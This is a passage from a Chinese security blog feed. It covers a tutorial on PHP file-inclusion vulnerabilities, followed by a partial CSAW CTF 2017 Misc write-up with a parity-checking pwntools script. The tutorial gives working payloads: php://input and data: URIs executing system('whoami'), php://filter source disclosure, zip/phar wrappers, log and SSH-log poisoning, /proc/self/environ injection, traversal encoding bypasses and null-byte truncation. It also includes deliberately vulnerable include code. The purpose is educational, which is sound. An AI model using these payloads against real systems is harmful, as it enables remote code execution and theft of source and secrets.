<p>在同目录下有个phpinfo.txt，其内容为<code>&lt;? phpinfo(); ?&gt;</code>。则只需要访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">index.php?file=phpinfo.txt</div></pre></td></tr></table></figure></p>
<p>即可成功解析phpinfo。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/3.png?raw=true" alt=""></p>
<h2 id="场景"><a href="#场景" class="headerlink" title="场景"></a>场景</h2><ol>
<li>具有相关的文件包含函数。</li>
<li>文件包含函数中存在动态变量，比如 <code>include $file;</code>。</li>
<li>攻击者能够控制该变量，比如<code>$file = $_GET[&#39;file&#39;];</code>。</li>
</ol>
<h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><h3 id="LFI-Local-File-Inclusion"><a href="#LFI-Local-File-Inclusion" class="headerlink" title="LFI(Local File Inclusion)"></a>LFI(Local File Inclusion)</h3><p>本地文件包含漏洞，顾名思义，指的是能打开并包含本地文件的漏洞。大部分情况下遇到的文件包含漏洞都是LFI。简单的测试用例如前所示。</p>
<h3 id="RFI-Remote-File-Inclusion"><a href="#RFI-Remote-File-Inclusion" class="headerlink" title="RFI(Remote File Inclusion)"></a>RFI(Remote File Inclusion)</h3><p>远程文件包含漏洞。是指能够包含远程服务器上的文件并执行。由于远程服务器的文件是我们可控的，因此漏洞一旦存在危害性会很大。<br>但RFI的利用条件较为苛刻，需要php.ini中进行配置</p>
<ol>
<li>allow_url_fopen = On</li>
<li>allow_url_include = On</li>
</ol>
<p>两个配置选项均需要为On，才能远程包含文件成功。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/4.png?raw=true" alt=""></p>
<p>在php.ini中，allow_url_fopen默认一直是On，而allow_url_include从php5.2之后就默认为Off。</p>
<h1 id="包含姿势"><a href="#包含姿势" class="headerlink" title="包含姿势"></a>包含姿势</h1><p>下面例子中测试代码均为：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">	$file = $_GET[<span class="string">'file'</span>];</div><div class="line">	<span class="keyword">include</span> $file;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>allow_url_fopen 默认为 On<br>allow_url_include 默认为 Off</p>
<p>若有特殊要求，会在利用条件里指出。</p>
<h2 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h2><h3 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h3><p>利用条件：</p>
<ol>
<li>allow_url_include = On。</li>
<li>对allow_url_fopen不做要求。</li>
</ol>
<p>姿势：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">index.php</div><div class="line">?file=php://input</div><div class="line"></div><div class="line">POST:</div><div class="line">&lt;? phpinfo();?&gt;</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/5.png?raw=true" alt=""></p>
<h3 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h3><p>利用条件：无甚</p>
<p>姿势：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">index.php?file=php://filter/read=convert.base64-encode/resource=index.php</div></pre></td></tr></table></figure></p>
<p>通过指定末尾的文件，可以读取经base64加密后的文件源码，之后再base64解码一下就行。虽然不能直接获取到shell等，但能读取敏感文件危害也是挺大的。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/8.png?raw=true" alt=""></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> base64</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>base64.b64decode(<span class="string">"PD9waHAgDQoJJGZpbGUgPSAkX0dFVFsnZmlsZSddOw0KCWluY2x1ZGUgJGZpbGU7DQo/Pg=="</span>)</div><div class="line"><span class="string">b"&lt;?php \r\n\t$file = $_GET['file'];\r\n\tinclude $file;\r\n?&gt;"</span></div></pre></td></tr></table></figure>
<p>其他姿势：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">index.php?file=php://filter/convert.base64-encode/resource=index.php</div></pre></td></tr></table></figure></p>
<p>效果跟前面一样，少了read等关键字。在绕过一些waf时也许有用。</p>
<h3 id="phar"><a href="#phar" class="headerlink" title="phar://"></a>phar://</h3><p>利用条件：</p>
<ol>
<li>php版本大于等于php5.3.0</li>
</ol>
<p>姿势：</p>
<p>假设有个文件phpinfo.txt，其内容为<code>&lt;?php phpinfo(); ?&gt;</code>，打包成zip压缩包，如下：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/9.png?raw=true" alt=""></p>
<p>指定绝对路径<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">index.php?file=phar://D:/phpStudy/WWW/fileinclude/test.zip/phpinfo.txt</div></pre></td></tr></table></figure></p>
<p>或者使用相对路径（这里test.zip就在当前目录下）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">index.php?file=phar://test.zip/phpinfo.txt</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/10.png?raw=true" alt=""></p>
<h3 id="zip"><a href="#zip" class="headerlink" title="zip://"></a>zip://</h3><p>利用条件：</p>
<ol>
<li>php版本大于等于php5.3.0</li>
</ol>
<p>姿势：<br>构造zip包的方法同phar。</p>
<p>但使用zip协议，需要指定绝对路径，同时将<code>#</code>编码为<code>%23</code>，之后填上压缩包内的文件。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">index.php?file=zip://D:\phpStudy\WWW\fileinclude\test.zip%23phpinfo.txt</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/11.png?raw=true" alt=""></p>
<p>若是使用相对路径，则会包含失败。</p>
<h3 id="data-URI-schema"><a href="#data-URI-schema" class="headerlink" title="data:URI schema"></a>data:URI schema</h3><p>利用条件：</p>
<ol>
<li>php版本大于等于php5.2</li>
<li>allow_url_fopen = On</li>
<li>allow_url_include = On</li>
</ol>
<p>姿势一：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">index.php?file=data:text/plain,&lt;?php phpinfo();?&gt;</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/6.png?raw=true" alt=""></p>
<p>执行命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">index.php?file=data:text/plain,&lt;?php system(&apos;whoami&apos;);?&gt;</div></pre></td></tr></table></figure></p>
<p>姿势二：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">index.php?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</div></pre></td></tr></table></figure></p>
<p>加号<code>+</code>的url编码为<code>%2b</code>，<code>PD9waHAgcGhwaW5mbygpOz8+</code>的base64解码为：<code>&lt;?php phpinfo();?&gt;</code><br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/7.png?raw=true" alt=""></p>
<p>执行命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">index.php?file=data:text/plain;base64,PD9waHAgc3lzdGVtKCd3aG9hbWknKTs/Pg==</div></pre></td></tr></table></figure></p>
<p>其中<code>PD9waHAgc3lzdGVtKCd3aG9hbWknKTs/Pg==</code>的base64解码为：<code>&lt;?php system(&#39;whoami&#39;);?&gt;</code></p>
<h2 id="包含session"><a href="#包含session" class="headerlink" title="包含session"></a>包含session</h2><p>利用条件：session文件路径已知，且其中内容部分可控。</p>
<p>姿势：</p>
<p>php的session文件的保存路径可以在phpinfo的session.save_path看到。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/14.png?raw=true" alt=""></p>
<p>在默认情况下一般是保存在<code>/tmp</code>目录中。</p>
<p>session的文件名格式为sess_[phpsessid]。而phpsessid在发送的请求的cookie字段中可以看到。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/16.png?raw=true" alt=""></p>
<p>要包含并利用的话，需要能控制部分sesssion文件的内容。暂时没有通用的办法。有些时候，可以先包含进session文件，观察里面的内容，然后根据里面的字段来发现可控的变量，从而利用变量来写入payload，并之后再次包含从而执行php代码。</p>
<p>比如这篇文章：<a href="http://kb.hitcon.org/post/165429468072/%E9%80%8F%E9%81%8E-lfi-%E5%BC%95%E5%85%A5-php-session-%E6%AA%94%E6%A1%88%E8%A7%B8%E7%99%BC-rce" target="_blank" rel="external">透過 LFI 引入 PHP session 檔案觸發 RCE</a></p>
<h2 id="包含日志"><a href="#包含日志" class="headerlink" title="包含日志"></a>包含日志</h2><h3 id="访问日志"><a href="#访问日志" class="headerlink" title="访问日志"></a>访问日志</h3><p>利用条件： 需要知道服务器日志的存储路径，且日志文件可读。</p>
<p>姿势：</p>
<p>很多时候，web服务器会将请求写入到日志文件中，比如说apache。在用户发起请求时，会将请求写入access.log，当发生错误时将错误写入error.log。默认情况下，日志保存路径在 /var/log/apache2/。</p>
<p>但如果是直接发起请求，会导致一些符号被编码使得包含无法正确解析。可以使用burp截包后修改。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/12.png?raw=true" alt=""></p>
<p>正常的php代码已经写入了 /var/log/apache2/access.log。然后进行包含即可。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/13.png?raw=true" alt=""></p>
<p>在一些场景中，log的地址是被修改掉的。你可以通过读取相应的配置文件后，再进行包含。</p>
<p>这里提供一道包含日志的CTF题目：<a href="https://chybeta.github.io/2017/08/06/SHACTF-2017-Web-writeup/#Methon-Two">SHACTF-2017- Bon Appétit (100)-writeup </a></p>
<h3 id="SSH-log"><a href="#SSH-log" class="headerlink" title="SSH log"></a>SSH log</h3><p>利用条件：需要知道ssh-log的位置，且可读。默认情况下为 /var/log/auth.log</p>
<p>姿势：</p>
<p>用ssh连接：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ubuntu@VM-207-93-ubuntu:~$ ssh &apos;&lt;?php phpinfo(); ?&gt;&apos;@remotehost</div></pre></td></tr></table></figure></p>
<p>之后会提示输入密码等等，随便输入。</p>
<p>然后在remotehost的ssh-log中即可写入php代码：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/17.png?raw=true" alt=""></p>
<p>之后进行文件包含即可。</p>
<p>参考：<a href="http://www.hackingarticles.in/rce-with-lfi-and-ssh-log-poisoning/" target="_blank" rel="external">RCE with LFI and SSH Log Poisoning</a></p>
<h2 id="包含environ"><a href="#包含environ" class="headerlink" title="包含environ"></a>包含environ</h2><p>利用条件：</p>
<ol>
<li>php以cgi方式运行，这样environ才会保持UA头。</li>
<li>environ文件存储位置已知，且environ文件可读。</li>
</ol>
<p>姿势：</p>
<p>proc/self/environ中会保存user-agent头。如果在user-agent中插入php代码，则php代码会被写入到environ中。之后再包含它，即可。</p>
<p>可以参考这个：</p>
<ol>
<li><a href="http://websecuritylog.blogspot.jp/2010/06/procselfenviron-injection.html" target="_blank" rel="external">The proc/self/environ Injection </a></li>
<li><a href="https://www.exploit-db.com/papers/12886/" target="_blank" rel="external">shell via LFI - proc/self/environ method</a></li>
</ol>
<h2 id="包含fd"><a href="#包含fd" class="headerlink" title="包含fd"></a>包含fd</h2><p>跟包含environ类似。</p>
<p>参考： <a href="https://highon.coffee/blog/lfi-cheat-sheet/#procselffd-lfi-method" target="_blank" rel="external">LFI Cheat Sheet：/proc/self/environ LFI Method</a></p>
<h2 id="包含临时文件"><a href="#包含临时文件" class="headerlink" title="包含临时文件"></a>包含临时文件</h2><p><img src="http://images2015.cnblogs.com/blog/804631/201511/804631-20151116135028890-525890377.jpg" alt=""></p>
<p>php中上传文件，会创建临时文件。在linux下使用/tmp目录，而在windows下使用c:\winsdows\temp目录。在临时文件被删除之前，利用竞争即可包含该临时文件。</p>
<p>由于包含需要知道包含的文件名。一种方法是进行暴力猜解，linux下使用的随机函数有缺陷，而window下只有65535中不同的文件名，所以这个方法是可行的。</p>
<p>另一种方法是配合phpinfo页面的php variables，可以直接获取到上传文件的存储路径和临时文件名，直接包含即可。这个方法可以参考<a href="https://www.insomniasec.com/downloads/publications/LFI%20With%20PHPInfo%20Assistance.pdf" target="_blank" rel="external">LFI With PHPInfo Assistance</a></p>
<p>类似利用临时文件的存在，竞争时间去包含的，可以看看这道CTF题：<a href="https://chybeta.github.io/2017/08/22/XMAN%E5%A4%8F%E4%BB%A4%E8%90%A5-2017-babyweb-writeup/">XMAN夏令营-2017-babyweb-writeup </a></p>
<h2 id="包含上传文件"><a href="#包含上传文件" class="headerlink" title="包含上传文件"></a>包含上传文件</h2><p>利用条件：千变万化，不过至少得知道上传的文件在哪，叫啥名字。。。</p>
<p>姿势：</p>
<p>往往要配合上传的姿势，不说了，太多了。</p>
<h2 id="其余"><a href="#其余" class="headerlink" title="其余"></a>其余</h2><p>一个web服务往往会用到多个其他服务，比如ftp服务，数据库等等。这些应用也会产生相应的文件，但这就需要具体情况具体分析咯。这里就不展开了。</p>
<h1 id="绕过姿势"><a href="#绕过姿势" class="headerlink" title="绕过姿势"></a>绕过姿势</h1><p>接下来聊聊绕过姿势。平常碰到的情况肯定不会是简简单单的<code>include $_GET[&#39;file&#39;];</code>这样直接把变量传入包含函数的。在很多时候包含的变量/文件不是完全可控的，比如下面这段代码指定了前缀和后缀：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">	$file = $_GET[<span class="string">'file'</span>];</div><div class="line">	<span class="keyword">include</span> <span class="string">'/var/www/html/'</span>.$file.<span class="string">'/test/test.php'</span>;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>这样就很“难”直接去包含前面提到的种种文件。</p>
<h2 id="指定前缀"><a href="#指定前缀" class="headerlink" title="指定前缀"></a>指定前缀</h2><p>先考虑一下指定了前缀的情况吧。测试代码:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">	$file = $_GET[<span class="string">'file'</span>];</div><div class="line">	<span class="keyword">include</span> <span class="string">'/var/www/html/'</span>.$file;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<h3 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h3><p>这个最简单了，简要的提一下。</p>
<p>现在在/var/log/test.txt文件中有php代码<code>&lt;?php phpinfo();?&gt;</code>，则利用<code>../</code>可以进行目录遍历，比如我们尝试访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">include.php?file=../../log/test.txt</div></pre></td></tr></table></figure></p>
<p>则服务器端实际拼接出来的路径为：/var/www/html/../../log/test.txt，也即/var/log/test.txt。从而包含成功。</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/18.png?raw=true" alt=""></p>
<h3 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h3><p>服务器端常常会对于<code>../</code>等做一些过滤，可以用一些编码来进行绕过。下面这些总结来自《白帽子讲Web安全》。</p>
<ul>
<li>利用url编码<ul>
<li>../<ul>
<li>%2e%2e%2f</li>
<li>..%2f</li>
<li>%2e%2e/  </li>
</ul>
</li>
<li>..\<ul>
<li>%2e%2e%5c</li>
<li>..%5c</li>
<li>%2e%2e\</li>
</ul>
</li>
</ul>
</li>
<li>二次编码<ul>
<li>../<ul>
<li>%252e%252e%252f</li>
</ul>
</li>
<li>..\<ul>
<li>%252e%252e%255c</li>
</ul>
</li>
</ul>
</li>
<li>容器/服务器的编码方式<ul>
<li>../<ul>
<li>..%c0%af<ul>
<li>注：<a href="https://security.stackexchange.com/questions/48879/why-does-directory-traversal-attack-c0af-work" target="_blank" rel="external">Why does Directory traversal attack %C0%AF work?</a></li>
</ul>
</li>
<li>%c0%ae%c0%ae/<ul>
<li>注：java中会把”%c0%ae”解析为”\uC0AE”，最后转义为ASCCII字符的”.”（点）</li>
<li>Apache Tomcat Directory Traversal</li>
</ul>
</li>
</ul>
</li>
<li>..\<ul>
<li>..%c1%9c</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="指定后缀"><a href="#指定后缀" class="headerlink" title="指定后缀"></a>指定后缀</h2><p>接着考虑指定后缀的情况。测试代码:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">	$file = $_GET[<span class="string">'file'</span>];</div><div class="line">	<span class="keyword">include</span> $file.<span class="string">'/test/test.php'</span>;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<h3 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h3><p>url格式<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">protocol :// hostname[:port] / path / [;parameters][?query]#fragment</div></pre></td></tr></table></figure></p>
<p>在远程文件包含漏洞（RFI）中，可以利用query或fragment来绕过后缀限制。</p>
<p>姿势一：query（？）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">index.php?file=http://remoteaddr/remoteinfo.txt?</div></pre></td></tr></table></figure></p>
<p>则包含的文件为 <a href="http://remoteaddr/remoteinfo.txt?/test/test.php" target="_blank" rel="external">http://remoteaddr/remoteinfo.txt?/test/test.php</a><br>问号后面的部分<code>/test/test.php</code>，也就是指定的后缀被当作query从而被绕过。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/19.png?raw=true" alt=""></p>
<p>姿势二：fragment（#）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">index.php?file=http://remoteaddr/remoteinfo.txt%23</div></pre></td></tr></table></figure></p>
<p>则包含的文件为 <a href="http://remoteaddr/remoteinfo.txt#/test/test.php" target="_blank" rel="external">http://remoteaddr/remoteinfo.txt#/test/test.php</a><br>问号后面的部分<code>/test/test.php</code>，也就是指定的后缀被当作fragment从而被绕过。注意需要把<code>#</code>进行url编码为<code>%23</code>。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/20.png?raw=true" alt=""></p>
<h3 id="利用协议"><a href="#利用协议" class="headerlink" title="利用协议"></a>利用协议</h3><p>前面有提到过利用zip协议和phar协议。假设现在测试代码为：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">	$file = $_GET[<span class="string">'file'</span>];</div><div class="line">	<span class="keyword">include</span> $file.<span class="string">'/test/test.php'</span>;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>构造压缩包如下：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/21.png?raw=true" alt=""></p>
<p>其中test.php内容为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;?php phpinfo(); ?&gt;</div></pre></td></tr></table></figure></p>
<p>利用zip协议，注意要指定绝对路径<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">index.php?file=zip://D:\phpStudy\WWW\fileinclude\chybeta.zip%23chybeta</div></pre></td></tr></table></figure></p>
<p>则拼接后为：zip://D:\phpStudy\WWW\fileinclude\chybeta.zip#chybeta/test/test.php</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/22.png?raw=true" alt=""></p>
<p>能成功包含。</p>
<p>在利用phar协议的时候有些问题。哪位能指教一下？<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/23.png?raw=true" alt=""></p>
<h3 id="长度截断"><a href="#长度截断" class="headerlink" title="长度截断"></a>长度截断</h3><p>利用条件： php版本 &lt; php 5.2.8</p>
<p>目录字符串，在linux下4096字节时会达到最大值，在window下是256字节。只要不断的重复<code>./</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">index.php?file=././././。。。省略。。。././shell.txt</div></pre></td></tr></table></figure></p>
<p>则后缀<code>/test/test.php</code>，在达到最大值后会被直接丢弃掉。</p>
<h3 id="0字节截断"><a href="#0字节截断" class="headerlink" title="0字节截断"></a>0字节截断</h3><p>利用条件： php版本 &lt; php 5.3.4</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">index.php?file=phpinfo.txt%00</div></pre></td></tr></table></figure>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/24.png?raw=true" alt=""></p>
<p>能利用00截断的场景现在应该很少了：）</p>
<h1 id="防御方案"><a href="#防御方案" class="headerlink" title="防御方案"></a>防御方案</h1><ol>
<li>在很多场景中都需要去包含web目录之外的文件，如果php配置了open_basedir，则会包含失败</li>
<li>做好文件的权限管理</li>
<li>对危险字符进行过滤等等</li>
</ol>
<h1 id="Refference"><a href="#Refference" class="headerlink" title="Refference"></a>Refference</h1><ul>
<li>《白帽子讲Web安全》</li>
<li><a href="https://dustri.org/b/from-lfi-to-rce-in-php.html" target="_blank" rel="external">From LFI to RCE in php </a></li>
<li><a href="http://www.cnblogs.com/iamstudy/articles/include_file.html" target="_blank" rel="external">l3m0n: 文件包含漏洞小结</a></li>
<li><a href="https://highon.coffee/blog/lfi-cheat-sheet/" target="_blank" rel="external">LFI Cheat Sheet</a></li>
<li><a href="https://github.com/lucyoa/ctf-wiki/tree/master/web/file-inclusion" target="_blank" rel="external">Local File Inclusion</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;php文件包含漏洞学习&lt;br&gt;合上吧，没有新姿势。&lt;br&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://chybeta.github.io/categories/Web-Security/"/>
    
    
      <category term="php" scheme="http://chybeta.github.io/tags/php/"/>
    
      <category term="文件包含" scheme="http://chybeta.github.io/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    
      <category term="伪协议" scheme="http://chybeta.github.io/tags/%E4%BC%AA%E5%8D%8F%E8%AE%AE/"/>
    
  </entry>
  
  <entry>
    <title>CSAW CTF 2017-MISC-writeup</title>
    <link href="http://chybeta.github.io/2017/10/07/CSAW-CTF-2017-MISC-writeup/"/>
    <id>http://chybeta.github.io/2017/10/07/CSAW-CTF-2017-MISC-writeup/</id>
    <published>2017-10-07T00:50:23.000Z</published>
    <updated>2017-10-07T02:20:05.046Z</updated>
    
    <content type="html"><![CDATA[<p>待续。<br><a id="more"></a></p>
<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="Serial"><a href="#Serial" class="headerlink" title="Serial"></a>Serial</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nc misc.chal.csaw.io 4239</div></pre></td></tr></table></figure>
<p>考察数据奇偶校验。nc连上后，如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">root@chybeta:~/Desktop/test# nc misc.chal.csaw.io 4239</div><div class="line">8-1-1 even parity. Respond with &apos;1&apos; if you got the byte, &apos;0&apos; to retransmit.</div><div class="line">00110010001</div><div class="line">0 # ps: 这是我发送的</div><div class="line">00100011001</div></pre></td></tr></table></figure></p>
<p>初次连上后，会给出一个字符串 00110010001，根据偶校验，选择发送是0还是1，然后服务器端会再返回下一个字符串。</p>
<p>从给出的提示信息，以及结合串口通信标准来看，每次我们收到的字符串总共是11位，其中第一位都是0，表示数据的开始，剩下的数据满足<code>8-1-1</code>，是指有8位数据位，1位校检位，以及1位的停止位。</p>
<p>比如说：00110010001</p>
<div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center">起始位</th>
<th style="text-align:center">数据位</th>
<th style="text-align:center">奇偶校验位</th>
<th style="text-align:center">停止位</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">0</td>
<td style="text-align:center">01100100</td>
<td style="text-align:center">0</td>
<td style="text-align:center">1</td>
</tr>
</tbody>
</table>
</div>
<p>这里数据位中1的个数是3，为奇数，奇偶校验位本应该为1，但接受的数据的奇偶校验位为0，说明发生了错误。根据题目的信息：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Respond with &apos;1&apos; if you got the byte, &apos;0&apos; to retransmit.</div></pre></td></tr></table></figure></p>
<p>我们要返回一个 0。</p>
<p>最后的脚本如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">r = remote(<span class="string">"misc.chal.csaw.io"</span>,<span class="number">4239</span>)</div><div class="line">r.recvuntil(<span class="string">"Respond with '1' if you got the byte, '0' to retransmit.\n"</span>)</div><div class="line"></div><div class="line">flag = <span class="string">""</span></div><div class="line"></div><div class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">	<span class="keyword">try</span>:</div><div class="line">		s = r.recv()</div><div class="line">		data = s[<span class="number">1</span>:<span class="number">9</span>]</div><div class="line">		even = s[<span class="number">9</span>]</div><div class="line">		end = s[<span class="number">10</span>]</div><div class="line">		num = <span class="number">0</span></div><div class="line">		<span class="keyword">for</span> i <span class="keyword">in</span>  data:</div><div class="line">			<span class="keyword">if</span> i == <span class="string">'1'</span>:</div><div class="line">				num = num + <span class="number">1</span></div><div class="line">		<span class="keyword">if</span> (num % <span class="number">2</span> == <span class="number">0</span>  <span class="keyword">and</span> even == <span class="string">"0"</span>) <span class="keyword">or</span> (num % <span class="number">2</span> != <span class="number">0</span> <span class="keyword">and</span> even == <span class="string">"1"</span>) :</div><div class="line">			r.sendline(<span class="string">"1"</span>)</div><div class="line">			flag += chr(int(data,<span class="number">2</span>))</div><div class="line">			<span class="comment"># print(chr(int(data,2)))</span></div><div class="line">			log.info(flag)</div><div class="line">		<span class="keyword">else</span>:</div><div class="line">			r.sendline(<span class="string">"0"</span>)</div><div class="line">	<span class="keyword">except</span>:</div><div class="line">		<span class="keyword">break</span></div><div class="line"></div><div class="line">log.success(<span class="string">"The flag : "</span> + flag)</div></pre></td></tr></table></figure></p>
<p>最后得到的flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">flag&#123;@n_int3rface_betw33n_data_term1nal_3quipment_and_d@t@_circuit-term1nating_3quipment&#125;</div></pre></td></tr></table></figure></p>
<h2 id="CVV"><a href="#CVV" class="headerlink" title="CVV"></a>CVV</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Hey fam, you got CVV? I need some CVV!</div><div class="line">nc misc.chal.csaw.io 8308</div></pre></td></tr></table></figure>
<h2 id="Twitch-Plays-Pwnable"><a href="#Twitch-Plays-Pwnable" class="headerlink" title="Twitch Plays Pwnable"></a>Twitch Plays Pwnable</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">How long does it take several thousand hackers to exploit a buffer overflow?</div><div class="line">https://twitch.tv/csawtv</div><div class="line">UPDATE 8:03 Eastern: Apparently the answer is ~10 hours to not exploit the overflow.</div></pre></td></tr></table></figure>
